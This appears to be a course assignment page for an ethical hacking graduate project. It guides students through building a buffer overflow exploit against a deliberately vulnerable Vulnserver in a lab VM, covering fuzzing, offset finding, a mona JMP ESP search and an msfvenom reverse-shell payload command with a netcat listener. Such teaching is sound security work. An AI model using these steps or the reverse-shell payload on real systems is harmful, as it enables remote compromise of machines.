<!DOCTYPE html>
<html>
<head>
	<title>Ethical Hacking Grad Project</title>
	<link rel="stylesheet" type="text/css" href="http://fonts.googleapis.com/css?family=Josefin Slab"> 	
	<link rel="stylesheet" type="text/css" href="css/neha.css">
	<script>
	function show_alert() {
		alert("File uploaded successfully");
			}
</script>

</head>
<body>
	<div class="header">
		<h1 >Buffer Overflow Exploit for Modified Vulnserver</h1>
	</div>
	<div class="main">
			<div class="sub">
				<div class="sub_sub"">
					<h4>The assignment gives you an opportunity to create and identify a buffer overflow exploit in a modified Vulnserver running on your Windows VM.</h4>
				</div>
			</div>

			<div class="sub">
				<div class="sub_sub"">
					<h3>Introduction to Vulnserver:</h3>
					<h4>
						Vulnserver is a Windows based threaded TCP server application that is designed to be exploited.
						<br/>
						The program is intended to be used as a learning tool to teach about the process of software exploitation, as well as a good victim program for testing new exploitation techniques and shellcode.
						<br/>
						It makes debugging, fuzzing and exploit writing awkward, and it seems very unlike the way most real life exploits actually operate (especially on Windows).
					</h4>
					<h5>
						WARNING: 
							VulnServer is unsafe to run. The Windows 7 machine will be vulnerable to compromise. It is recommended to perform this project on virtual machines with NAT networking mode, so no outside attacker can exploit your windows machine.
							Do not keep this running all the time unless required.

					</h5>
				</div>	
			</div>
			<div class="sub">
				<div class="sub_sub"">
					<h3>Pre-Requisites:</h3>
					<ol>
						<li>Basic Python Scripting.</li>
						<li>Kali Linux Virtual Machine</li>
						<li>Modified Vulnserver on your Windows system. </li>
						<li>Immunity Debugger. You can also use OllyDbg 1.10.</li>
						<li>Metasploit Framework.This can be obtained for Windows and Linux from here: <a href="http://www.metasploit.com/">Click here to download</a></li>
						<li>A copy of netcat. Most Linux systems should already have one installed, you can grab a Windows version from here: <a href="http://joncraton.org/blog/46">Click here to download</a></li>
						<li>Nmap for kali.</li>
						
					</ol>
				</div>
			</div>
			<div class="sub">
				
				<div class="sub">
				<div class="sub_sub"">
					<h3>Overview:</h3>
					This project guides you through all the steps of developing a Buffer Overflow exploit, using a program that deliberately has a simple buffer overflow vulnerability.
					<ol>
						<li>Download and running the modified Vulnserver</li>
						<li>Verify that the modified vulnserver is Running or Active </li>
						<li>Finding the active Ports using nmap</li>
						<li>Setup the netcat listener and testing the server</li>
						<li>Using Vulnserver Commands</li>
						<li>Fuzzing the server and Identifying a vulnerability</li>
						<li>Using Pattern_create.rb, find out the buffer size</li>
						<li>Find the value of EIP</li>
						<li>Identifying the Offset</li>
						<li>Generating the shellcode</li>
						<li>Install Mona if not already</li>
						<li>Using the mona command</li>
						<li>Buffer Overflow Exploit of modified Vulnerserver</li>
						<li>Restart the netcat listener</li>
						<li>Check if Reverse shell is generated</li>
					</ol>
				</div>
			</div>
			<div class="sub">
				<div class="sub_sub"">		
					<h3>Steps to be followed:</h3>
					<h4>
					You will need 2 terminals open for this.  Just like in class, you need a main terminal for generating payloads, running mypython.py, etc., and another terminal with a netcat listener listening for the reverse shell.  Therefore, you must use the script command in both terminals to create 4 files using 1 call to script in each terminal window.
					</h4>	
						<ol>
							<li><b>GradProject-timing.txt</b> will be the script timing file for the main terminal window.</li>
							<li><b>mainGradProject.log</b> will be the script log for the main terminal window.</li>
							<li><b>netcat-timing.txt</b> will be the script timing file for the netcat terminal window.</li>
							<li><b>netcat.log</b> will be the script log file for the netcat terminal window.</li>
						</ol>
				</div>
				
				<div class="points">
				<h3>1. Download and running the modified Vulnserver</h3>
				Download the modified Vulnserver using the above link on your Windows VM Machine. And now start or run the modified server.	
				<div class="img">
							<img class="imageclass" src="css/Images/Step1.png"/>
						</div>
				</div>

				<div class="points">
					<div>
						<h3>2. Verify that the modified vulnserver is Running or Active</h3>
						Check if the modified vulnserver is running using nmap scan on your Kali Linux VM.
					</div>
				</div>

				<div class="points">
					<div>
						<h3>3. Finding the active Ports using nmap</h3>
						Using aggressive scan method find out the ports on which it is running
						<div class="img">
							<img class="imageclass" src="css/Images/Step3.png"/>
						</div>
					</div>
				</div>
					
				</div>
				
				<div class="points">
					<div>
						<h3>4. Setup the netcat listener and testing the server</h3>
						Connect to the modified Vulnserver using the port number. For this you will be using netcat command on your kali Linux VM.
						<div class="img">
							<img class="imageclass" src="css/Images/Step4.png"/>
						</div>
				</div>
				</div>
				
				<div class="points">
					<div><h3>5. Vulnserver Commands</h3>
						Weâ€™ve successfully connected to the Vulnserver TCP server program.The Vulnserver is now asking us to enter a HELP command to display its help. 
						When we enter the HELP command it is able to fetch all the commands from the modified vulnserver as follows:
						<div class="img">
							<img class="imageclass" src="css/Images/Step5.1.png"/>
						</div>
					</div>
				</div>

				<div class="points">
					<div>
					<h3>6. Fuzzing the server and Identifying a vulnerability </h3>
						The most difficult step is to actually find a vulnerability that can be exploited to gain code execution. In this case we will use a technique called Fuzzing.
						Thereby we simply send unexpected data to the service and observe what happens</br>
				
					<a href="https://bogner.sh/2016/04/the-hard-life-of-exploit-developers/">Click here to refer</a>
					</div>
				</div>

				<div class="points">
					<div><h3>7. Using Pattern_create.rb, to create an unique pattern</h3>
						After you find the vulnerable function, now run the following command to create a unique pattern: </br> </br>
						<font color="blue"><center><b>/usr/share/metasploit-framework/tools/pattern_create.rb 10000</b></center>
						</br></br></font>
					</div>
				</div>
				<div class="points">
					<div><h3>8. Find the value of EIP</h3>
						Note the value of EIP in Immunity Debugger so that we can identify the offset.
					</div>
					<div class="img">
						<img class="imageclass" src="css/Images/Step7.1.png"/>
					</div>
				</div>
				
				<div class="points">
					<div><h3>9. Identifying the Offset</h3>
						To identify the offset we can use Metasploit using the value of EIP.
					</div>
					<div class="img">
						<img class="imageclass" src="css/Images/Step7.2.png"/>
					</div>
					This means, that the value at offset 2204 is the one that overwrites the return address on the stack and finally ends up in EIP.
					As EIP contains the address of the next instruction that will be executed we now have to find a suitable address we can jump to.
				</div>

				<div class="points">
					<div><h3>10. Generating the shellcode</h3>
						Now we will create a shell code using the msfvenom tool along with the port number on which the host will be listening and the listening host ip address for the reverse shell.
						Make use of following command : 
					</br></br><font color="blue" ><center><b>msfvenom -p windows/shell_reverse_tcp LHOST=ip address of Kali machine LPORT=443 -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d"</b><center></font>
					</br></div>
										
					<div class="img">
						<img class="imageclass" src="css/Images/Step9.png"/>
					</div>
				</div>
				
				<div class="points">
					<div><h3>11. Install Mona if not already</h3>
						Download mona.py from the link : <a href="https://github.com/corelan/mona">Click here to download</a>
						Simply drop mona.py into the 'PyCommands' folder (inside the Immunity Debugger application folder).
						<div class="img">
						<img class="imageclass" src="css/Images/Step10.png"/>
					</div>
				</div>
				</div>
				<div class="points">
					<div><h3>12. Using the mona command</h3>
						Now run the modified vulnserver and the Immunity Debugger using run as administrator and attach vulnserver in it.
						Use the following mona command in the immunity debugger to know the EIP address that vulnserver is pointing towards.This requires the dll file which should be kept in the folder where you have kept the modified vulnserver.
						In Immunity, at the bottom, there is a white bar. Click in that bar and type this command, followed by the Enter key:
						</br></br><font color="blue" ><center><b>!mona find -s "\xff\xe4" -m essfunc.dll</b><center></font></br>
						<div class="img">
						<img class="imageclass" src="css/Images/Step11.png"/>
					</div>
				</div>
				
				</div>
				<div class="points">
					<div><h3>13. Buffer Overflow Exploit of modified Vulnerserver</h3>
						Write a python Script which will send buffer to overflow the modified vulnserver. Take care that few characters are added so that it is not sending null values and make use of nop characters too.
						Insert the exploit code we generated using msfvenom into this python script.
						You can find many python scripts online for the references.
						Try to understand the logic and implement it accordingly.
						Also make the program executable. To do that, in Kali Linux, in a Terminal window, execute this command:
						</br></br><font color="blue" ><center><b>chmod a+x python.py</b><center></font> </br>
					</div>
				</div>

				<div class="points">
					<div><h3>14. Start the netcat listener</h3>
						Make use of the port number used while generating the shell code and start listening to it on kali linux VM using netcat.
				</div>
				</div>
				<div class="points">
					<div><h3>15. Check if Reverse shell is generated</h3>
						Also restart the immunity debugger and attach it to vulnserver. Now run the python script in another terminal. 
						And check in kali linux if the reverse shell is generated to that listening terminal as shown below.
					</div>
					<div class="img">
						<img class="imageclass" src="css/Images/Step13.png"/>
					</div>
				</div>

				<div class="points">
					<div><h3>Submit your all files</h3>
							Upload all the log files and your python file in a single zip file named BufferOverflow.zip and upload it.	
					<form  method="post" enctype="multipart/form-data" onSubmit="alert('File has uploaded successfully');">
						<input type="file" name="fileToUpload" id="fileToUpload" ><br/><br/>
						<input type="submit" value="Upload" name="submit" >
					</form>
					</div>
				</div>

			</div>
	</div>
	<div class="footer">
	</div>
</body>
</html>